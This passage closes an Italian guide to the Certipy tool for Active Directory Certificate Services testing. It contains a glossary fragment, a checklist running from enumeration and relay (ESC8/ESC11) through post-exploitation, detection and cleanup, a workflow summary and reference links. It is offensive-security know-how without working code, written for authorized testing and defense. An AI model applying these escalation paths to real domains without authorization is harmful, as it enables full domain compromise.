| Schannel               | Stack TLS/certificate authentication Windows                               |
| PFX/P12                | Contenitore di certificato e private key                                   |
| SID security extension | Estensione che lega il certificato all'object SID AD                       |
| NTAuth                 | Store AD delle CA trusted per autenticazione                               |
| Enrollment Agent       | Identità autorizzata a richiedere certificati on-behalf-of                 |
| EPA                    | Extended Protection for Authentication                                     |
| ESC                    | Classificazione delle escalation AD CS introdotta dalla ricerca SpecterOps |

***

## Checklist finale Certipy

```text
PREPARAZIONE
☐ Certipy aggiornato e versione annotata
☐ DNS e clock sincronizzati
☐ Scope CA/DC/template confermato
☐ Directory evidence protetta

ENUMERAZIONE
☐ find completo in JSON/CSV
☐ find -enabled -vulnerable
☐ find -oids
☐ CA, template, endpoint e ACL mappati
☐ Strong mapping/KB5014754 verificati

VALIDAZIONE
☐ Reachability dell'utente confermata
☐ Template pubblicato sulla CA corretta
☐ EKU/Application Policies analizzati
☐ UPN/DNS/SID coerenti
☐ PKINIT e/o Schannel testati
☐ Impatto minimo sufficiente dimostrato

RELAY
☐ ESC8: HTTPS/EPA/NTLM verificati
☐ ESC11: packet privacy verificata
☐ Coercion esplicitamente autorizzata
☐ Template macchina/DC appropriato

POST-EXPLOITATION PKI
☐ Privilegi CA distinti da local admin
☐ Backup CA evitato se non necessario
☐ Golden Certificate trattato come Tier 0
☐ PFX e chiavi protetti

DETECTION
☐ Eventi 4882-4900 raccolti
☐ 4768/4771 correlati
☐ 5136 e SACL su attributi critici
☐ IIS/RPC/NTLM telemetry disponibile
☐ Baseline richieste certificate legittime

CLEANUP
☐ Template ripristinati
☐ UPN/SPN/DNS ripristinati
☐ Shadow Credential rimossa per Device ID
☐ Officer/manager rimossi
☐ Template pubblicati per test disabilitati
☐ Account test eliminati quando previsto
☐ Certificati di test gestiti secondo ROE
☐ Segreti e ticket distrutti
```

***

## Conclusione

Certipy non è soltanto il comando `find -vulnerable`. È un framework operativo per comprendere la fiducia certificate-based di Active Directory: chi può ottenere un certificato, quale identità viene inserita, come il dominio la mappa e quali servizi la accettano.

Il workflow corretto nel 2026 è:

```text
find → verifica reachability → comprendi strong mapping → req/relay/shadow/template/ca
→ ispeziona il certificato → auth PKINIT o Schannel → dimostra l'impatto minimo
→ raccogli detection → ripristina → retest
```

Le guide ferme alle sole ESC1-ESC8 o ai comandi Certipy 4.x rischiano oggi di produrre errori tecnici e falsi positivi. Certipy 5.1 copre **ESC1-ESC17**, usa una sintassi aggiornata per template e relay e deve essere letto insieme alle modifiche Microsoft sul strong certificate mapping.

Dal punto di vista difensivo, lo stesso strumento permette di trovare i path prima che vengano sfruttati. Esegui assessment periodici, integra i risultati con BloodHound e Defender for Identity, proteggi CA e private key come asset Tier 0 e tratta ogni certificato di autenticazione come una credenziale riutilizzabile.

> AD CS non è “solo la CA”. È un sistema di identità parallelo alle password: template, ACL, OID, mapping, enrollment endpoint e chiavi private possono trasformare un normale account di dominio in una compromissione completa.

***

## Risorse verificate

* [Certipy — repository ufficiale](https://github.com/ly4k/Certipy)
* [Certipy Wiki — Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
* [Certipy Wiki — Privilege Escalation ESC1-ESC17](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
* [Certipy Wiki — Installation](https://github.com/ly4k/Certipy/wiki/02-%E2%80%90-Installation)
* [SpecterOps — Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
* [The Hacker Recipes — AD CS](https://www.thehacker.recipes/ad/movement/ad-cs/)
* [HackTricks — AD Certificates](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
* [Microsoft KB5014754 — certificate-based authentication changes](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
* [Microsoft Defender for Identity — Certificates security posture assessments](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
* [Microsoft — PKI events to monitor](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786423\(v=ws.11\))
* [Hackita — AD CS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [Hackita — AD CS EKU e OID](https://hackita.it/articoli/adcs-eku-oid-offensive/)
* [Hackita — Certify](https://hackita.it/articoli/certify/)
* [Hackita — Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [Hackita — NTLM Relay](https://hackita.it/articoli/ntlm-relay/)
